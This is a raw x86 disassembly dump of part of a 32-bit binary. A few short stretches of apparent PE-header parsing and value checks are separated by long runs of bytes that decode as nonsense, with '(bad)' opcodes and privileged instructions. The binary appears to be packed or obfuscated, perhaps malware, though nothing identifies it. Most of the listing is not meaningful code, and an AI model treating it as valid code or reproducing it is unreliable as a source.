  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x54cb928f
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	dec    edi
  408ec5:	push   esp
  408ec6:	or     eax,0xb6182ea1
  408ecb:	repz ret 0xd115
  408ecf:	retf   
  408ed0:	in     eax,0x52
  408ed2:	in     al,0xa3
  408ed4:	push   ebx
  408ed5:	inc    ebp
  408ed6:	out    0x4b,al
  408ed8:	pop    edi
  408ed9:	dec    ecx
  408eda:	out    0xbb,eax
  408edc:	jecxz  0x408ef8
  408ede:	(bad)  
  408edf:	adc    BYTE PTR [edi],ch
  408ee1:	das    
  408ee2:	add    DWORD PTR [ebx+0x489027e6],edx
  408ee8:	xor    BYTE PTR [esi+0x67fdcca2],0x54
  408eef:	outs   dx,DWORD PTR ds:[esi]
  408ef0:	jae    0x408e7a
  408ef2:	hlt    
  408ef3:	jg     0x408ebe
  408ef5:	pop    es
  408ef6:	adc    DWORD PTR [ecx+0x6d],esp
  408ef9:	call   0x8c398e1b
  408efe:	jge    0x408f58
  408f00:	adc    BYTE PTR [edi],0x2b
  408f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f04:	es inc esp
  408f06:	rcl    BYTE PTR [edi-0x1eb7c340],cl
  408f0c:	dec    esp
  408f0d:	fldcw  WORD PTR [ebp-0xffde391]
  408f13:	jnp    0x408e9b
  408f15:	dec    eax
  408f16:	wrmsr  
  408f18:	sub    DWORD PTR [edx-0x79f268f6],edx
  408f1e:	jae    0x408eab
  408f20:	not    bl
  408f22:	sbb    cl,cl
  408f24:	cmp    eax,0x3f634f94
  408f29:	hlt    
  408f2a:	add    DWORD PTR [edi-0x2d],eax
  408f2d:	push   ebp
  408f2e:	push   esp
  408f2f:	jo     0x408edd
  408f31:	xchg   DWORD PTR [esi+eax*8-0x2174a5af],edi
  408f38:	out    0x7f,al
  408f3a:	mov    bh,0xd2
  408f3c:	push   ecx
  408f3d:	adc    eax,DWORD PTR [esi-0x59]
  408f40:	push   edx
  408f41:	mov    eax,ds:0x6bb3dc05
  408f46:	pushf  
  408f47:	jl     0x408f56
  408f49:	(bad)  
  408f4a:	fbstp  TBYTE PTR [ebx+0x7b]
  408f4d:	mov    al,0xb5
  408f4f:	addr16 dec eax
  408f51:	jae    0x408f20
  408f53:	dec    bx
  408f55:	mov    dl,0xb4
  408f57:	xchg   al,cl
  408f59:	inc    esp
  408f5a:	mov    bh,dl
  408f5c:	lods   al,BYTE PTR ds:[esi]
  408f5d:	in     al,0x2f
  408f5f:	js     0x408f6d
  408f61:	inc    ebx
  408f62:	sbb    DWORD PTR [ebx],esp
  408f64:	jmp    0x16d45d5c
  408f69:	adc    al,bl
  408f6b:	call   0xd6cb15e1
  408f70:	aad    0x39
  408f72:	imul   eax,DWORD PTR [ecx],0xffffffa2
  408f75:	mov    bh,0x57
  408f77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f78:	into   
  408f79:	call   0x5367:0x33ff46c5
  408f80:	jbe    0x408f4e
  408f82:	jg     0x408f66
  408f84:	inc    edx
  408f85:	pop    edx
  408f86:	ins    BYTE PTR es:[edi],dx
  408f87:	das    
  408f88:	push   edx
  408f89:	scas   eax,DWORD PTR es:[edi]
  408f8a:	retf   
  408f8b:	lock adc DWORD PTR [ebx],edi
  408f8e:	cld    
  408f8f:	test   eax,0xe9190cf7
  408f94:	retf   
  408f95:	inc    edx
  408f96:	xor    al,al
  408f98:	bound  ebx,QWORD PTR [ebx-0x4c8b0f66]
  408f9e:	inc    ebx
  408f9f:	push   es
  408fa0:	mov    ecx,0x2569e8b
  408fa5:	dec    esp
  408fa6:	dec    ebp
  408fa7:	jbe    0x408fc0
  408fa9:	pop    esi
  408faa:	js     0x408fc4
  408fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fad:	test   DWORD PTR [edi-0x70],edi
  408fb0:	inc    esp
  408fb1:	int3   
  408fb2:	js     0x408f9b
  408fb4:	(bad)  
  408fb5:	icebp  
  408fb6:	and    eax,0xe627ee32
  408fbb:	cli    
  408fbc:	ds push es
  408fbe:	sub    DWORD PTR [ebx],esi
  408fc0:	ds and ah,ch
  408fc3:	push   cs
  408fc4:	leave  
  408fc5:	nop
  408fc6:	mov    al,ds:0x2672d45f
  408fcb:	fild   WORD PTR [ebx]
  408fcd:	inc    eax
  408fce:	mov    edi,0x2a828c82
  408fd3:	sbb    esi,edi
  408fd5:	add    al,0x81
  408fd7:	test   eax,0x456f8228
  408fdc:	xchg   ecx,eax
  408fdd:	clc    
  408fde:	enter  0xdfce,0xce
  408fe2:	adc    dl,bl
  408fe4:	std    
  408fe5:	mov    ebp,0x744fca66
  408fea:	shl    BYTE PTR [eax+0x23],cl
  408fed:	jnp    0x408f98
  408fef:	std    
  408ff0:	jb     0x408fa0
  408ff2:	ss jmp 0x1fefa3c2
  408ff8:	jbe    0x409069
  408ffa:	arpl   WORD PTR [edi+0x73d00cea],dx
  409000:	in     al,dx
  409001:	jmp    0xfbe28f8e
  409006:	xor    ch,BYTE PTR [edx-0x6c536b5d]
  40900c:	mov    ch,BYTE PTR ds:0xb5bbb791
  409012:	scas   al,BYTE PTR es:[edi]
  409013:	in     eax,0xf9
  409015:	mov    dl,0xa3
  409017:	sbb    eax,0x19dd394e
  40901c:	lods   al,BYTE PTR ds:[esi]
  40901d:	and    edx,DWORD PTR [ebp+0x48]
  409020:	mov    ds:0x6e5c00e0,al
  409025:	mov    bh,0x57
  409027:	add    dl,dh
  409029:	jg     0x408fe9
  40902b:	pop    edi
  40902c:	jns    0x409000
  40902e:	pop    ebp
  40902f:	xchg   esi,eax
  409030:	xor    DWORD PTR [ecx-0x33f3e9a1],esp
  409036:	mov    esp,0xddb7c0e8
  40903b:	inc    esi
  40903c:	inc    edx
  40903d:	jp     0x408fd9
  40903f:	pop    edi
  409040:	adc    edi,DWORD PTR [ebx+0x48]
  409043:	sub    cl,BYTE PTR [edx-0x1d9ade2c]
  409049:	inc    ebx
  40904a:	push   eax
  40904b:	xchg   DWORD PTR [ebx+0x414285ad],esi
  409051:	pusha  
  409052:	sbb    BYTE PTR [ecx+0x53],dh
  409055:	in     al,0xc6
  409057:	imul   edx,DWORD PTR [eax+edx*1+0x51],0xffffff8f
  40905c:	push   0x3a5beb9b
  409061:	fwait
  409062:	push   edx
  409063:	imul   eax,DWORD PTR [ebx+0x4c],0x62
  409067:	mov    ebp,DWORD PTR [eax]
  409069:	test   DWORD PTR [ebx],ebx
  40906b:	mov    al,0x50
  40906d:	dec    ecx
  40906e:	mov    dl,0x38
  409070:	pusha  
  409071:	pop    ebx
  409072:	jle    0x4090ce
  409074:	mov    al,al
  409076:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409077:	es xchg ecx,eax
  409079:	add    edx,DWORD PTR [ecx+0x795e4a87]
  40907f:	mov    dl,BYTE PTR [eax]
  409081:	test   al,0xb
  409083:	push   esp
  409084:	pop    esp
  409085:	mov    esp,0x713019d3
  40908a:	scas   al,BYTE PTR es:[edi]
  40908b:	lods   al,BYTE PTR ds:[esi]
  40908c:	(bad)  
  40908d:	cmp    al,0xa
  40908f:	fcomp  st(1)
  409091:	(bad)  
  409092:	fsub   DWORD PTR [edx-0x1c006274]
  409098:	xor    ch,BYTE PTR [eax+0x28]
  40909b:	or     BYTE PTR [esp+eiz*8+0x3ab0c6cd],cl
  4090a2:	pop    esp
  4090a3:	and    ah,dh
  4090a5:	or     al,0xe4
  4090a7:	or     ebp,DWORD PTR [eax+eiz*2+0x745fe4b3]
  4090ae:	push   0xffffffbd
  4090b0:	add    DWORD PTR [ebx+esi*1],edx
  4090b3:	stc    
  4090b4:	cmp    bh,BYTE PTR [esi+0x5c130467]
  4090ba:	mov    edi,0x5bf04dfe
  4090bf:	aaa    
  4090c0:	jnp    0x4090e2
  4090c2:	and    ebx,ebp
  4090c4:	jns    0x409123
  4090c6:	mov    cl,0x4b
  4090c8:	stc    
  4090c9:	in     al,0x6d
  4090cb:	xchg   edx,eax
  4090cc:	out    0xec,al
  4090ce:	and    al,0xb3
  4090d0:	sbb    DWORD PTR [edi+0x3ec80a2f],ecx
  4090d6:	(bad)  
  4090d7:	dec    ebp
  4090d8:	cmp    DWORD PTR cs:0xc11b8375,esi
  4090df:	arpl   WORD PTR [ebx+ecx*1],si
  4090e2:	pop    edx
  4090e3:	mov    dl,0x2e
  4090e5:	sub    DWORD PTR [ebx-0x678a5934],eax
  4090eb:	adc    bl,ch
  4090ed:	xchg   DWORD PTR [ebx],esi
  4090ef:	mov    BYTE PTR [ebx],0xc7
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0xa0
  409163:	and    WORD PTR [edi+0x7e7edf32],sp
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	sbb    al,0xa4
  409170:	(bad)  [esi-0x38f6a62]
  409176:	jae    0x40910d
  409178:	pop    edx
  409179:	xor    edi,DWORD PTR [edx+eax*8+0x41]
  40917d:	jbe    0x409198
  40917f:	and    bh,BYTE PTR [edx-0x30c4740e]
  409185:	out    0xbe,eax
  409187:	sub    BYTE PTR [edi-0xac2ca4a],dh
  40918d:	and    al,0x30
  40918f:	(bad)  
  409190:	rcr    BYTE PTR [edi+0x71],cl
  409193:	mov    edi,0x5c3404bb
  409198:	jp     0x40920a
  40919a:	je     0x40919a
  40919c:	out    0x56,al
  40919e:	xchg   edi,eax
  40919f:	nop
  4091a0:	test   eax,0x30ed93fc
  4091a5:	jmp    0x7dde8ce5
  4091aa:	fstp   TBYTE PTR [ebp-0x7b3a3dfb]
  4091b0:	test   BYTE PTR [eax*8-0x25b91bd2],cl
  4091b7:	and    ah,bl
  4091b9:	aas    
  4091ba:	or     eax,0x36a80444
  4091bf:	jle    0x40921a
  4091c1:	sub    edi,ebx
  4091c3:	cmp    al,0x67
  4091c5:	pusha  
  4091c6:	in     eax,dx
  4091c7:	and    bl,ch
  4091c9:	in     al,0x66
  4091cb:	fisubr DWORD PTR [ecx-0x1323fdd4]
  4091d1:	retf   
  4091d2:	rol    BYTE PTR [eax+0x2b],1
  4091d5:	push   ebp
  4091d6:	das    
  4091d7:	pop    edx
  4091d8:	scas   eax,DWORD PTR es:[edi]
  4091d9:	(bad)  
  4091da:	dec    sp
  4091dc:	dec    esp
  4091dd:	not    DWORD PTR [ecx+0x2dc0789b]
  4091e3:	dec    edx
  4091e4:	lods   al,BYTE PTR ds:[esi]
  4091e5:	fstp   QWORD PTR [esi+0x27]
  4091e8:	jbe    0x409187
  4091ea:	xchg   esp,eax
  4091eb:	mov    ch,0xf1
  4091ed:	not    edx
  4091ef:	lods   al,BYTE PTR ds:[esi]
  4091f0:	mov    bh,0xe1
  4091f2:	lea    esp,[ebp-0x35]
  4091f5:	mov    cs,WORD PTR [edx-0x14a1205]
  4091fb:	scas   al,BYTE PTR es:[edi]
  4091fc:	std    
  4091fd:	mov    al,0xee
  4091ff:	cmp    BYTE PTR [ecx-0x3a],dl
  409202:	ins    DWORD PTR es:[edi],dx
  409203:	jmp    0xfc2e9006
  409208:	imul   esp,DWORD PTR [edx-0x13],0xffffff90
  40920c:	pop    esp
  40920d:	out    0x7f,eax
  40920f:	dec    ebp
  409210:	dec    DWORD PTR [edx+ebp*8-0x6]
  409214:	sub    eax,0x39e60c7d
  409219:	test   al,0x63
  40921b:	clc    
  40921c:	popf   
  40921d:	pop    ebx
  40921e:	jmp    0x73eea873
  409223:	push   edi
  409224:	(bad)  
  409225:	into   
  409226:	hlt    
  409227:	pop    es
  409228:	xor    cl,BYTE PTR [edx-0x47]
  40922b:	dec    ebx
  40922c:	xor    al,0x57
  40922e:	and    al,0x5d
  409230:	pop    ecx
  409231:	sar    dh,1
  409233:	sub    al,0xe
  409235:	inc    edx
  409236:	ficom  WORD PTR [edx]
  409238:	sbb    BYTE PTR [esi-0x118e7bfe],bh
  40923e:	je     0x4092a5
  409240:	add    esi,edi
  409242:	push   ds
  409243:	or     bl,BYTE PTR [edx+0x4a7d6dde]
  409249:	xchg   edi,eax
  40924a:	xor    ecx,eax
  40924c:	add    al,0xce
  40924e:	mov    ebp,DWORD PTR [esi-0x712fc18a]
  409254:	xor    DWORD PTR [esi-0x19c7820b],edx
  40925a:	jb     0x4092b2
  40925c:	lds    ecx,FWORD PTR [esi*2-0x10012c70]
  409263:	cdq    
  409264:	cs repnz cdq 
  409267:	enter  0x34b7,0xb3
  40926b:	nop
  40926c:	inc    eax
  40926d:	and    eax,0x268001b2
  409272:	mov    dl,0x48
  409274:	and    BYTE PTR ds:0x1885f304,ah
  40927a:	pop    eax
  40927b:	mov    bh,0xd
  40927d:	xor    DWORD PTR [ebx-0x8d6e9fa],ebp
  409283:	pop    edi
  409284:	fcomp  DWORD PTR [ecx]
  409286:	in     eax,dx
  409287:	nop
  409288:	arpl   WORD PTR [ecx-0x67a743b5],sp
  40928e:	shl    bl,cl
  409290:	retf   0x7a7b
  409293:	cmp    dh,BYTE PTR [ebx-0x27c57552]
  409299:	hlt    
  40929a:	and    DWORD PTR [ebx-0x167aff82],0x76
  4092a1:	dec    edi
  4092a2:	imul   al
  4092a4:	pop    eax
  4092a5:	sbb    al,0xfc
  4092a7:	(bad)  
  4092a8:	xlat   BYTE PTR ds:[ebx]
  4092a9:	add    eax,0xd90d56eb
  4092ae:	fisubr DWORD PTR [edx-0x7019a695]
  4092b4:	loope  0x4092a2
  4092b6:	cld    
  4092b7:	dec    esp
  4092b8:	aaa    
  4092b9:	and    esi,DWORD PTR [eax+edx*4-0x70]
  4092bd:	cmp    cl,BYTE PTR [edx]
  4092bf:	fiadd  WORD PTR [esi]
  4092c1:	inc    edi
  4092c2:	popf   
  4092c3:	cmp    BYTE PTR [edi-0x65ba32aa],al
  4092c9:	sub    bl,BYTE PTR [edi-0x5bee21a3]
  4092cf:	push   ebp
  4092d0:	outs   dx,BYTE PTR ss:[esi]
  4092d2:	loopne 0x40930b
  4092d4:	mov    al,ds:0xcb3dcc0e
  4092d9:	add    eax,0x348299af
  4092de:	stos   BYTE PTR es:[edi],al
  4092df:	cmc    
  4092e0:	adc    eax,0x22be551c
  4092e5:	fimul  WORD PTR [ebp+0x796bf024]
  4092eb:	test   eax,0x92dd018
  4092f0:	imul   ebx,DWORD PTR [eax],0x3b97d060
  4092f6:	cmp    ch,bl
  4092f8:	ja     0x4092c4
  4092fa:	test   bl,dh
  4092fc:	rol    edi,cl
  4092fe:	push   esp
  4092ff:	jmp    0x7bcf2371
  409304:	stos   DWORD PTR es:[edi],eax
  409305:	das    
  409306:	sbb    BYTE PTR [esi-0x15],ah
  409309:	clc    
  40930a:	int3   
  40930b:	mov    eax,ds:0xc4e7848c
  409310:	rol    esp,cl
  409312:	in     eax,0x4d
  409314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409315:	call   0xf52:0xd23f2ea9
  40931c:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40931e:	adc    ecx,DWORD PTR [ecx-0x3b]
  409321:	mov    esp,0x19d2fa39
  409326:	clc    
  409327:	sahf   
  409328:	(bad)  
  409329:	pusha  
  40932a:	loopne 0x4092be
  40932c:	xor    eax,0x53a6bac7
  409331:	push   ebp
  409332:	push   edi
  409333:	(bad)  
  409334:	rcr    bl,1
  409336:	mov    DWORD PTR [ecx+0x6afa9e73],edx
  40933c:	mov    al,0xb
  40933e:	pop    esi
  40933f:	add    ecx,ebx
  409341:	je     0x409338
  409343:	sub    ecx,DWORD PTR [ebp+0x31]
  409346:	add    al,0x48
  409348:	sub    bh,BYTE PTR [eax]
  40934a:	push   ebx
  40934b:	push   esp
  40934c:	sbb    eax,0x37975304
  409351:	pusha  
  409352:	aas    
  409353:	or     BYTE PTR [ebx],bh
  409355:	rol    ebx,1
  409357:	and    DWORD PTR ds:0xbd443552,eax
  40935d:	out    dx,eax
  40935e:	test   DWORD PTR [eax],edx
  409360:	dec    ecx
  409361:	xchg   edx,eax
  409362:	cs call 0xc90a:0x5114d36c
  40936a:	or     DWORD PTR [eax],ebp
  40936c:	pop    esi
  40936d:	mov    DWORD PTR [edi+0x58],esp
  409370:	cmp    bl,BYTE PTR [eax-0x54]
  409373:	sbb    al,BYTE PTR [edx+edi*1]
  409376:	jne    0x4093ec
  409378:	and    esp,DWORD PTR [edx-0x6a]
  40937b:	xchg   ecx,eax
  40937c:	sub    ah,bh
  40937e:	(bad)  
  40937f:	test   al,0x97
  409381:	addr16 push edx
  409383:	iret   
  409384:	mov    bh,BYTE PTR [eax+edi*2+0x587d6098]
  40938b:	inc    edi
  40938c:	jmp    0xa14a442e
  409391:	(bad)  
  409392:	cmc    
  409393:	xor    eax,0x4a5957da
  409398:	mov    DWORD PTR [eax],ecx
  40939a:	mov    eax,DWORD PTR [ebp+0xc]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	iret   
  4093b5:	xor    dl,BYTE PTR [edi]
  4093b7:	and    eax,0x7e7eddd8
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	pop    eax
  4093c1:	or     DWORD PTR [edx+eiz*1+0x24ed52f8],ebx
  4093c8:	dec    esi
  4093c9:	pop    ds
  4093ca:	and    BYTE PTR [edx-0x32d020bf],dl
  4093d0:	mul    BYTE PTR [edi-0x2b]
  4093d3:	cmp    DWORD PTR [esi-0xbd290ca],ebp
  4093d9:	pop    ebp
  4093da:	xor    al,0x53
  4093dc:	inc    edx
  4093dd:	mov    al,0xcd
  4093df:	xor    cl,ch
  4093e1:	or     al,0xb0
  4093e3:	pushf  
  4093e4:	out    dx,eax
  4093e5:	sub    eax,0x93b188ba
  4093ea:	sub    bl,bl
  4093ec:	es rcl DWORD PTR ss:[edi+0x75],1
  4093f1:	repnz push 0xe3dd16bd
  4093f7:	jo     0x409386
  4093f9:	mov    dh,0x3d
  4093fb:	cmp    eax,0x3ba0bb9e
  409400:	pop    ds
  409401:	(bad)
  409404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409405:	mov    cl,0x87
  409407:	jno    0x409485
  409409:	stc    
  40940a:	imul   eax,DWORD PTR [esi+0x249370fc],0xba8db909
  409414:	mov    dh,0x99
  409416:	(bad)  
  409417:	jp     0x409465
  409419:	fstp   TBYTE PTR [edx-0x67]
  40941c:	inc    edx
  40941d:	das    
  40941e:	jp     0x40949b
  409420:	jb     0x40945f
  409422:	sbb    ch,BYTE PTR [edi]
  409424:	(bad)  
  409425:	xor    dh,BYTE PTR [edx-0x28]
  409428:	hlt    
  409429:	dec    eax
  40942a:	adc    al,0xa8
  40942c:	clc    
  40942d:	xchg   edi,eax
  40942e:	cmc    
  40942f:	adc    ebx,DWORD PTR [ebx-0x60]
  409432:	jns    0x409401
  409434:	sub    edi,DWORD PTR [ecx*2+0x33c5d9e8]
  40943b:	std    
  40943c:	jg     0x4093c3
  40943e:	mov    ah,0xec
  409440:	pop    edi
  409441:	cld    
  409442:	cmc    
  409443:	push   ds
  409444:	daa    
  409445:	pop    ebx
  409446:	(bad)  
  409447:	mov    eax,0xd6ca9f40
  40944c:	leave  
  40944d:	mov    al,0x9d
  40944f:	stos   BYTE PTR es:[edi],al
  409450:	push   ebp
  409451:	sbb    al,0xd7
  409453:	repnz les ebp,FWORD PTR [ecx]
  409456:	outs   dx,DWORD PTR ds:[esi]
  409457:	outs   dx,BYTE PTR ds:[esi]
  409458:	cs dec edx
  40945a:	push   ecx
  40945b:	(bad)  [edx]
  40945d:	and    eax,0x51d7ee49
  409462:	push   0x7a
  409464:	in     eax,0xd9
  409466:	jno    0x4094c8
  409468:	or     BYTE PTR [ebx],0xc3
  40946b:	stos   BYTE PTR es:[edi],al
  40946c:	in     al,dx
  40946d:	cmp    al,0x51
  40946f:	(bad)  
  409470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409471:	mov    eax,ds:0xfcc94c9b
  409476:	lods   al,BYTE PTR ds:[esi]
  409477:	call   0xae3f:0xe1908d83
  40947e:	pop    ebx
  40947f:	jbe    0x4094a5
  409481:	sbb    esi,edi
  409483:	xlat   BYTE PTR ds:[ebx]
  409484:	jo     0x4094b7
  409486:	sahf   
  409487:	ins    DWORD PTR es:[edi],dx
  409488:	mov    edx,ebp
  40948a:	or     al,0x79
  40948c:	push   ebx
  40948d:	mov    al,0xdc
  40948f:	rcl    DWORD PTR [esi-0x1a],1
  409492:	(bad)  
  409493:	dec    edi
  409494:	and    eax,0x94732444
  409499:	dec    esp
  40949a:	xlat   BYTE PTR ds:[ebx]
  40949b:	xchg   edx,eax
  40949c:	push   0xaef5ed3d
  4094a1:	pop    esi
  4094a2:	push   esi
  4094a3:	inc    ecx
  4094a4:	fmul   DWORD PTR [ebx]
  4094a6:	mov    esp,0xca7f165b
  4094ab:	(bad)  [ebx+0x5a]
  4094ae:	data16 (bad) 
  4094b0:	push   ss
  4094b1:	fidiv  WORD PTR [ecx]
  4094b3:	mov    dl,0xab
  4094b5:	mov    ebx,0x84dbf9d8
  4094ba:	aad    0x84
  4094bc:	mov    ecx,0x1fb1aa04
  4094c1:	push   esp
  4094c2:	call   0xfb6a2d6f
  4094c7:	retf   0xac72
  4094ca:	push   esi
  4094cb:	mov    ds:0xba63e7f0,eax
  4094d0:	xchg   edi,eax
  4094d1:	jle    0x409525
  4094d3:	in     eax,dx
  4094d4:	mov    DWORD PTR [ebx+0x1d089f7b],esi
  4094da:	in     al,0xea
  4094dc:	lods   al,BYTE PTR ds:[esi]
  4094dd:	xchg   esi,eax
  4094de:	cmp    eax,0x60f0355b
  4094e3:	jae    0x4094c2
  4094e5:	or     eax,0x9d4db6d3
  4094ea:	(bad)  
  4094ec:	int    0x8c
  4094ee:	pop    es
  4094ef:	inc    esi
  4094f0:	cdq    
  4094f1:	xor    eax,0x410bfc76
  4094f6:	shr    DWORD PTR [edx+0x2b],0xc1
  4094fa:	push   edi
  4094fb:	cmp    esi,DWORD PTR ds:0x99796b90
  409501:	retf   0x2449
  409504:	fcomp  QWORD PTR [ecx-0x51395aba]
  40950a:	sub    eax,0x6999eb82
  40950f:	daa    
  409510:	jl     0x4094d3
  409512:	cs mov al,0xd
  409515:	leave  
  409516:	mov    eax,ds:0x3a567c8e
  40951b:	ss jo  0x4094e8
  40951e:	xor    BYTE PTR [ecx],al
  409520:	imul   esp,ebx,0x841e1004
  409526:	or     DWORD PTR [ebx+0x34],edi
  409529:	jnp    0x4094c7
  40952b:	mov    dl,dh
  40952d:	mov    eax,0xf150aab0
  409532:	dec    ecx
  409533:	shl    bh,1
  409535:	mov    edi,DWORD PTR [esi]
  409537:	or     DWORD PTR [edx],ecx
  409539:	into   
  40953a:	adc    dh,BYTE PTR [edx+0x3f319127]
  409540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409541:	push   ebx
  409542:	inc    ecx
  409543:	les    esp,FWORD PTR [eax-0x49552c9b]
  409549:	arpl   WORD PTR [ecx+0x53da0997],sp
  40954f:	inc    esp
  409550:	mov    ch,0x98
  409552:	add    al,0xcf
  409554:	mov    al,ds:0xc8ea80a1
  409559:	adc    BYTE PTR [edi-0x1073ef7e],ah
  40955f:	jmp    0x8c7:0xac07be69
  409566:	push   ss
  409567:	cmc    
  409568:	call   0xee860c42
  40956d:	add    eax,0x1381dd20
  409572:	and    eax,0x4c7bbc66
  409577:	adc    ebp,DWORD PTR [ebx+0x50cb9684]
  40957d:	test   dl,cl
  40957f:	xchg   esi,eax
  409580:	jno    0x4095ad
  409582:	loopne 0x40951a
  409584:	shr    BYTE PTR [edx+0x7987481d],0x6e
  40958b:	outs   dx,BYTE PTR ds:[esi]
  40958c:	jne    0x409566
  40958e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40958f:	inc    edx
  409590:	jnp    0x4095be
  409592:	xchg   ah,ch
  409594:	(bad)  
  409595:	cmp    al,0x98
  409597:	ss add al,0x96
  40959a:	(bad)  
  40959b:	js     0x4095a4
  40959d:	sub    BYTE PTR [edi],dl
  40959f:	cmp    BYTE PTR [edi],al
  4095a1:	jbe    0x4095c0
  4095a3:	jp     0x4095cf
  4095a5:	and    eax,DWORD PTR [esi]
  4095a7:	addr16 aas 
  4095a9:	(bad)  
  4095aa:	sub    bh,BYTE PTR [esi+0x7b]
  4095ad:	out    dx,al
  4095ae:	or     al,cl
  4095b0:	repnz mov WORD PTR [ebx],es
  4095b3:	repz xor esi,DWORD PTR [eax]
  4095b6:	xor    DWORD PTR [eax],0x51
  4095b9:	add    cl,bh
  4095bb:	jne    0x4095ec
  4095bd:	or     DWORD PTR [ecx-0x16],edx
  4095c0:	and    ah,BYTE PTR [ebp+0x7b8cd321]
  4095c6:	mov    ebp,0xfad4f31a
  4095cb:	cdq    
  4095cc:	jmp    0x3469fd46
  4095d1:	xor    edi,DWORD PTR [edi-0x6f6a4ac3]
  4095d7:	mov    bh,0xb2
  4095d9:	sub    eax,0xdc3a616c
  4095de:	lock mov esp,0x4bbd7efb
  4095e4:	mov    esi,0x657786eb
  4095e9:	test   eax,ebp
  4095eb:	and    ch,dl
  4095ed:	(bad)  
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8ec6:0x18fd784e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	pextrw eax,(bad),0xc5
  40960e:	inc    edx
  40960f:	mov    bl,BYTE PTR [edx-0x697a0b40]
  409615:	add    BYTE PTR [edi],0x84
  409618:	and    al,0x34
  40961a:	mov    al,0xa9
  40961c:	add    al,0xd0
  40961e:	lea    ebp,[esi]
  409620:	loop   0x409682
  409622:	fisub  WORD PTR [edx+0x64]
  409625:	ret    
  409626:	loopne 0x4095b0
  409628:	push   ecx
  409629:	ins    DWORD PTR es:[edi],dx
  40962a:	push   ds
  40962b:	sbb    DWORD PTR [edi-0x2d],ecx
  40962e:	pop    ds
  40962f:	mov    edi,0x1a019a51
  409634:	adc    al,0x8a
  409636:	loopne 0x4095fa
  409638:	out    dx,eax
  409639:	aas    
  40963a:	cmp    al,0xa
  40963c:	add    al,0xa6
  40963e:	push   cs
  40963f:	xchg   BYTE PTR [edi+0x4b71a01b],dh
  409645:	inc    ebx
  409646:	stc    
  409647:	mov    bh,0x3c
  409649:	adc    dh,dh
  40964b:	(bad)  
